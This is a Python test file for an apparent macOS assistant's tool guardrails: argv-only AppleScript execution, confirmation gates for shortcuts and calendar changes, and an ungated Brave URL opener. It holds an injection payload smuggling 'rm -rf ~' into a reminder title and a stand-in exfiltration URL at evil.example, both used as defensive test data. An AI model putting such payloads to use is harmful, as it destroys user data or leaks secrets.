"""Tests for assistant.mac_tools — the security-critical guardrails in
particular.

Runnable directly (no test framework required yet). subprocess.run is
monkeypatched throughout so these tests don't require macOS, an installed
Music/Reminders/Notes/Shortcuts app, or Automation permission grants — the
manual, real-app verification for those lives in STEPS.md (Phase 4 step 4),
not here. What's tested here is the guardrail *shape*: argv-list execution
only, model-supplied values never interpolated into AppleScript source, and
run_shortcut's confirmation gate actually blocking execution before resume.

Phase 13 adds the same shape of coverage for Apple Calendar (create/update
gating + read-back-before-gating for update) and open_url_in_brave (argv-
only, deliberately ungated). Live verification against a real Calendar.app
instance and real Brave Browser is recorded in STEPS.md, not here.
"""

import asyncio
import tempfile
import uuid
from contextlib import contextmanager
from pathlib import Path
from types import SimpleNamespace
from typing import TypedDict

from langgraph.graph import END, START, StateGraph
from langgraph.types import Command

import assistant.mac_tools as mac_tools
from assistant.memory import get_checkpointer


class State(TypedDict):
    result: str | None


@contextmanager
def _capture_subprocess_calls():
    """Monkeypatch mac_tools.subprocess.run to record calls instead of
    actually running anything, returning a successful no-op result."""
    calls = []
    original = mac_tools.subprocess.run

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    mac_tools.subprocess.run = fake_run
    try:
        yield calls
    finally:
        mac_tools.subprocess.run = original


# --- argv-injection-safety: values are passed as osascript's own argv, ------
# --- never string-interpolated into the AppleScript source itself ----------


def test_run_osascript_passes_args_as_separate_argv_not_interpolated() -> None:
    with _capture_subprocess_calls() as calls:
        malicious_title = '"; do shell script "rm -rf ~"; --'
        mac_tools._run_osascript(mac_tools._REMINDERS_CREATE, ["", malicious_title, ""])

    assert len(calls) == 1
    argv = calls[0]
    # The script source is one fixed, hardcoded argument...
    assert argv[0:2] == ["osascript", "-e"]
    assert argv[2] == mac_tools._REMINDERS_CREATE
    # ...and the "malicious" value shows up as its own separate argv item,
    # verbatim, never concatenated into the script text itself.
    assert malicious_title in argv[3:]
    assert malicious_title not in argv[2]


def test_open_app_uses_plain_open_cli_not_osascript() -> None:
    with _capture_subprocess_calls() as calls:
        mac_tools.open_app.invoke({"name": "Safari"})

    assert calls == [["open", "-a", "Safari"]]


def test_music_play_song_passes_song_and_artist_as_argv() -> None:
    with _capture_subprocess_calls() as calls:
        mac_tools.music_play_song.invoke({"song": "Dream Brother", "artist": "Jeff Buckley"})

    assert len(calls) == 1
    argv = calls[0]
    assert argv[0:2] == ["osascript", "-e"]
    assert argv[2] == mac_tools._MUSIC_PLAY_SONG
    assert argv[3:] == ["Dream Brother", "Jeff Buckley"]


def test_music_play_playlist_passes_name_as_argv() -> None:
    with _capture_subprocess_calls() as calls:
        mac_tools.music_play_playlist.invoke({"name": "Favourite Songs"})

    assert calls == [["osascript", "-e", mac_tools._MUSIC_PLAY_PLAYLIST, "Favourite Songs"]]


def test_create_shortcut_opens_blank_editor_with_no_prefill() -> None:
    """No name/action parameters are passed — confirmed empirically that the
    create-shortcut URL scheme ignores them (STEPS.md 33), so the tool must
    not claim to pre-fill anything it can't actually deliver."""
    with _capture_subprocess_calls() as calls:
        mac_tools.create_shortcut.invoke({})

    assert calls == [["open", "shortcuts://create-shortcut"]]


# --- run_shortcut's confirmation gate --------------------------------------


def _build_isolated_graph(checkpointer, name: str):
    def node(state: State) -> dict:
        return {"result": mac_tools.run_shortcut.invoke({"name": name})}

    builder = StateGraph(State)
    builder.add_node("act", node)
    builder.add_edge(START, "act")
    builder.add_edge("act", END)
    return builder.compile(checkpointer=checkpointer)


async def _run_shortcut_gate_case(resume: bool) -> tuple[list, dict]:
    with tempfile.TemporaryDirectory() as tmp:
        async with get_checkpointer(Path(tmp) / "scratch.sqlite") as checkpointer:
            graph = _build_isolated_graph(checkpointer, "Some Shortcut")
            config = {
                "configurable": {"thread_id": str(uuid.uuid4()), "checkpoint_ns": ""}
            }
            with _capture_subprocess_calls() as calls:
                result = await graph.ainvoke({"result": None}, config=config)
                assert "__interrupt__" in result, f"expected interrupt, got {result}"
                resumed = await graph.ainvoke(Command(resume=resume), config=config)
            return calls, resumed


def test_run_shortcut_declined_never_invokes_shortcuts_cli() -> None:
    calls, resumed = asyncio.run(_run_shortcut_gate_case(resume=False))
    assert calls == [], f"shortcuts CLI should never run on decline, but got: {calls}"
    assert resumed["result"] == "Cancelled — user did not confirm."


def test_run_shortcut_confirmed_invokes_shortcuts_cli_with_exact_name() -> None:
    calls, resumed = asyncio.run(_run_shortcut_gate_case(resume=True))
    assert calls == [["shortcuts", "run", "Some Shortcut"]]
    assert resumed["result"] == "Ran shortcut: Some Shortcut"


# --- Apple Calendar: date-component conversion (Phase 13) -------------------
# _iso_datetime_argv never string-parses a locale-dependent date — verify it
# matches an independently-computed local-time conversion instead of
# hardcoding an expected value that would be wrong on a machine in a
# different timezone than the one this was written on.


def test_iso_datetime_argv_matches_independent_local_conversion_with_explicit_offset() -> None:
    from datetime import datetime as _dt

    iso = "2026-08-01T10:00:00-07:00"
    components = mac_tools._iso_datetime_argv(iso, "America/Los_Angeles")
    expected = _dt.fromisoformat(iso).astimezone()
    expected_seconds = expected.hour * 3600 + expected.minute * 60 + expected.second
    assert components == [
        str(expected.year),
        str(expected.month),
        str(expected.day),
        str(expected_seconds),
    ]


def test_iso_datetime_argv_applies_timezone_arg_when_iso_has_no_offset() -> None:
    from datetime import datetime as _dt
    from zoneinfo import ZoneInfo

    iso = "2026-08-01T10:00:00"
    components = mac_tools._iso_datetime_argv(iso, "America/Los_Angeles")
    expected = _dt.fromisoformat(iso).replace(tzinfo=ZoneInfo("America/Los_Angeles")).astimezone()
    expected_seconds = expected.hour * 3600 + expected.minute * 60 + expected.second
    assert components == [
        str(expected.year),
        str(expected.month),
        str(expected.day),
        str(expected_seconds),
    ]


def test_iso_datetime_argv_bad_timezone_raises_not_swallowed() -> None:
    """Tool errors are data, not exceptions (CLAUDE.md) — but that means the
    CALLER catches this, not that this helper should silently swallow it."""
    from zoneinfo import ZoneInfoNotFoundError

    raised = False
    try:
        mac_tools._iso_datetime_argv("2026-08-01T10:00:00", "Not/AZone")
    except ZoneInfoNotFoundError:
        raised = True
    assert raised


# --- Apple Calendar: gated create/update ------------------------------------


def _build_tool_graph(checkpointer, tool_name: str, tool_args: dict):
    def node(state: State) -> dict:
        target = getattr(mac_tools, tool_name)
        return {"result": target.invoke(tool_args)}

    builder = StateGraph(State)
    builder.add_node("act", node)
    builder.add_edge(START, "act")
    builder.add_edge("act", END)
    return builder.compile(checkpointer=checkpointer)


async def _run_gated_tool(tool_name: str, tool_args: dict, resume, capture=_capture_subprocess_calls):
    with tempfile.TemporaryDirectory() as tmp:
        async with get_checkpointer(Path(tmp) / "scratch.sqlite") as checkpointer:
            graph = _build_tool_graph(checkpointer, tool_name, tool_args)
            config = {"configurable": {"thread_id": str(uuid.uuid4()), "checkpoint_ns": ""}}
            with capture() as calls:
                first = await graph.ainvoke({"result": None}, config=config)
                assert "__interrupt__" in first, f"expected interrupt, got {first}"
                resumed = await graph.ainvoke(Command(resume=resume), config=config)
            return calls, resumed


def test_calendar_create_event_declined_never_invokes_osascript() -> None:
    calls, resumed = asyncio.run(
        _run_gated_tool(
            "calendar_create_event",
            {
                "title": "Team Sync",
                "start": "2026-08-01T10:00:00-07:00",
                "end": "2026-08-01T11:00:00-07:00",
                "timezone": "America/Los_Angeles",
                "calendar_name": "Home",
            },
            resume=False,
        )
    )
    assert calls == [], f"osascript must never run on decline, but got: {calls}"
    assert resumed["result"] == "Cancelled — user did not confirm."


def test_calendar_create_event_approved_passes_numeric_date_components_as_argv() -> None:
    """Same argv-only principle as _run_osascript's own guardrail test above:
    the fixed script text never changes, and every date is passed as
    numeric year/month/day/seconds-since-midnight — never a string built
    from user/model input that AppleScript would have to locale-parse."""
    calls, resumed = asyncio.run(
        _run_gated_tool(
            "calendar_create_event",
            {
                "title": "Team Sync",
                "start": "2026-08-01T10:00:00-07:00",
                "end": "2026-08-01T11:00:00-07:00",
                "timezone": "America/Los_Angeles",
                "calendar_name": "Home",
                "location": "Zoom",
                "notes": "agenda TBD",
            },
            resume=True,
        )
    )
    assert len(calls) == 1
    argv = calls[0]
    assert argv[0:3] == ["osascript", "-e", mac_tools._CALENDAR_CREATE_EVENT]
    assert argv[3:7] == ["Home", "Team Sync", "Zoom", "agenda TBD"]
    date_components = argv[7:]
    assert len(date_components) == 8
    for item in date_components:
        assert item.lstrip("-").isdigit(), f"expected a numeric argv item, got {item!r}"
    assert "Created event" in resumed["result"]


_SAMPLE_EVENT_ROW = (
    "Team Sync|Monday, 3 August 2026 at 10:00:00 AM|Monday, 3 August 2026 at "
    "11:00:00 AM|Work|Room 4|Weekly check-in|2026|8|3|36000|2026|8|3|39600"
)


@contextmanager
def _capture_subprocess_calls_with_calendar_get(get_stdout=_SAMPLE_EVENT_ROW, update_stdout="updated"):
    """Like _capture_subprocess_calls, but returns canned real-looking
    responses for the GET/UPDATE calendar scripts specifically — needed
    because calendar_update_event's read-back-before-gating step (mirroring
    write_tools.py's _read_back_event) requires real parseable content to
    reach the gate at all."""
    calls = []
    original = mac_tools.subprocess.run

    def fake_run(argv, **kwargs):
        calls.append(argv)
        script = argv[2] if len(argv) > 2 else ""
        if script == mac_tools._CALENDAR_GET_EVENT:
            return SimpleNamespace(returncode=0, stdout=get_stdout, stderr="")
        if script == mac_tools._CALENDAR_UPDATE_EVENT:
            return SimpleNamespace(returncode=0, stdout=update_stdout, stderr="")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    mac_tools.subprocess.run = fake_run
    try:
        yield calls
    finally:
        mac_tools.subprocess.run = original


def test_calendar_update_event_reads_back_before_showing_gate() -> None:
    """An opaque event id alone isn't human-vettable — the gate payload's
    "current" field must reflect the REAL read-back content, not a guess."""

    async def _run():
        with tempfile.TemporaryDirectory() as tmp:
            async with get_checkpointer(Path(tmp) / "scratch.sqlite") as checkpointer:
                graph = _build_tool_graph(
                    checkpointer, "calendar_update_event", {"event_id": "E1", "title": "Team Sync (renamed)"}
                )
                config = {"configurable": {"thread_id": str(uuid.uuid4()), "checkpoint_ns": ""}}
                with _capture_subprocess_calls_with_calendar_get() as calls:
                    result = await graph.ainvoke({"result": None}, config=config)
                return calls, result

    calls, result = asyncio.run(_run())
    assert "__interrupt__" in result
    assert any(argv[2] == mac_tools._CALENDAR_GET_EVENT for argv in calls)
    payload = result["__interrupt__"][0].value
    assert payload["current"]["title"] == "Team Sync"
    assert payload["current"]["location"] == "Room 4"
    assert payload["changes"] == {"title": "Team Sync (renamed)"}


def test_calendar_update_event_read_back_failure_refuses_to_proceed() -> None:
    with tempfile.TemporaryDirectory() as tmp:

        async def _run():
            async with get_checkpointer(Path(tmp) / "scratch.sqlite") as checkpointer:
                graph = _build_tool_graph(
                    checkpointer, "calendar_update_event", {"event_id": "NOPE", "title": "X"}
                )
                config = {"configurable": {"thread_id": str(uuid.uuid4()), "checkpoint_ns": ""}}
                with _capture_subprocess_calls_with_calendar_get(get_stdout="NOTFOUND") as calls:
                    result = await graph.ainvoke({"result": None}, config=config)
                return calls, result

        calls, result = asyncio.run(_run())
    assert "__interrupt__" not in result
    assert "could not read back" in result["result"]
    assert all(argv[2] != mac_tools._CALENDAR_UPDATE_EVENT for argv in calls)


def test_calendar_update_event_declined_never_invokes_update_script() -> None:
    calls, resumed = asyncio.run(
        _run_gated_tool(
            "calendar_update_event",
            {"event_id": "E1", "title": "Team Sync (renamed)"},
            resume=False,
            capture=_capture_subprocess_calls_with_calendar_get,
        )
    )
    assert all(argv[2] != mac_tools._CALENDAR_UPDATE_EVENT for argv in calls)
    assert resumed["result"] == "Cancelled — user did not confirm."


def test_calendar_update_event_approved_preserves_unspecified_fields() -> None:
    """Only title is being changed; location/description/start/end must be
    resolved from the READ-BACK current values, never left blank/defaulted —
    an AppleScript `set location of ev to ""` would silently wipe it."""
    calls, resumed = asyncio.run(
        _run_gated_tool(
            "calendar_update_event",
            {"event_id": "E1", "title": "Team Sync (renamed)"},
            resume=True,
            capture=_capture_subprocess_calls_with_calendar_get,
        )
    )
    update_calls = [argv for argv in calls if argv[2] == mac_tools._CALENDAR_UPDATE_EVENT]
    assert len(update_calls) == 1
    argv = update_calls[0]
    # event_id, title, location, description — location/description carried
    # over from the read-back sample row ("Room 4" / "Weekly check-in"),
    # never blanked just because they weren't part of this update's changes.
    assert argv[3:7] == ["E1", "Team Sync (renamed)", "Room 4", "Weekly check-in"]
    assert "Updated event" in resumed["result"]


def test_calendar_update_event_requires_timezone_when_changing_start() -> None:
    with _capture_subprocess_calls_with_calendar_get():
        result = mac_tools.calendar_update_event.invoke({"event_id": "E1", "start": "2026-08-02T09:00:00"})
    assert "timezone is required" in result


def test_calendar_update_event_no_fields_reports_nothing_to_update() -> None:
    """Read-back must still happen (can't know there's nothing to change
    without it in principle), but this only fires once fields are validated
    as empty — verified against the real read-back tool directly."""
    with _capture_subprocess_calls_with_calendar_get() as calls:
        result = mac_tools.calendar_update_event.invoke({"event_id": "E1"})
    assert result == "Nothing to update — no fields were provided."
    assert all(argv[2] != mac_tools._CALENDAR_UPDATE_EVENT for argv in calls)


# --- open_url_in_brave (Phase 13, deliberately ungated) ---------------------


def test_open_url_in_brave_passes_url_as_argv_never_shell() -> None:
    with _capture_subprocess_calls() as calls:
        result = mac_tools.open_url_in_brave.invoke({"url": "https://example.com/?q=1"})

    assert calls == [["open", "-a", "Brave Browser", "https://example.com/?q=1"]]
    assert "Opened in Brave" in result


def test_open_url_in_brave_is_ungated_no_interrupt_needed() -> None:
    """Deliberate, per the 2026-07-15 checkpoint decision recorded in
    mac_tools.py's module docstring and STEPS.md — this test documents the
    CURRENT behavior, not an endorsement; if this test starts failing
    because a gate was added, update STEPS.md's decision record too, don't
    just patch the test."""
    with _capture_subprocess_calls() as calls:
        result = mac_tools.open_url_in_brave.invoke({"url": "https://evil.example/?exfil=secret"})

    assert len(calls) == 1
    assert "Opened in Brave" in result


if __name__ == "__main__":
    test_run_osascript_passes_args_as_separate_argv_not_interpolated()
    print("OK: test_run_osascript_passes_args_as_separate_argv_not_interpolated")
    test_open_app_uses_plain_open_cli_not_osascript()
    print("OK: test_open_app_uses_plain_open_cli_not_osascript")
    test_music_play_song_passes_song_and_artist_as_argv()
    print("OK: test_music_play_song_passes_song_and_artist_as_argv")
    test_music_play_playlist_passes_name_as_argv()
    print("OK: test_music_play_playlist_passes_name_as_argv")
    test_create_shortcut_opens_blank_editor_with_no_prefill()
    print("OK: test_create_shortcut_opens_blank_editor_with_no_prefill")
    test_run_shortcut_declined_never_invokes_shortcuts_cli()
    print("OK: test_run_shortcut_declined_never_invokes_shortcuts_cli")
    test_run_shortcut_confirmed_invokes_shortcuts_cli_with_exact_name()
    print("OK: test_run_shortcut_confirmed_invokes_shortcuts_cli_with_exact_name")
    test_iso_datetime_argv_matches_independent_local_conversion_with_explicit_offset()
    print("OK: test_iso_datetime_argv_matches_independent_local_conversion_with_explicit_offset")
    test_iso_datetime_argv_applies_timezone_arg_when_iso_has_no_offset()
    print("OK: test_iso_datetime_argv_applies_timezone_arg_when_iso_has_no_offset")
    test_iso_datetime_argv_bad_timezone_raises_not_swallowed()
    print("OK: test_iso_datetime_argv_bad_timezone_raises_not_swallowed")
    test_calendar_create_event_declined_never_invokes_osascript()
    print("OK: test_calendar_create_event_declined_never_invokes_osascript")
    test_calendar_create_event_approved_passes_numeric_date_components_as_argv()
    print("OK: test_calendar_create_event_approved_passes_numeric_date_components_as_argv")
    test_calendar_update_event_reads_back_before_showing_gate()
    print("OK: test_calendar_update_event_reads_back_before_showing_gate")
    test_calendar_update_event_read_back_failure_refuses_to_proceed()
    print("OK: test_calendar_update_event_read_back_failure_refuses_to_proceed")
    test_calendar_update_event_declined_never_invokes_update_script()
    print("OK: test_calendar_update_event_declined_never_invokes_update_script")
    test_calendar_update_event_approved_preserves_unspecified_fields()
    print("OK: test_calendar_update_event_approved_preserves_unspecified_fields")
    test_calendar_update_event_requires_timezone_when_changing_start()
    print("OK: test_calendar_update_event_requires_timezone_when_changing_start")
    test_calendar_update_event_no_fields_reports_nothing_to_update()
    print("OK: test_calendar_update_event_no_fields_reports_nothing_to_update")
    test_open_url_in_brave_passes_url_as_argv_never_shell()
    print("OK: test_open_url_in_brave_passes_url_as_argv_never_shell")
    test_open_url_in_brave_is_ungated_no_interrupt_needed()
    print("OK: test_open_url_in_brave_is_ungated_no_interrupt_needed")
    print("\n20 tests passed")
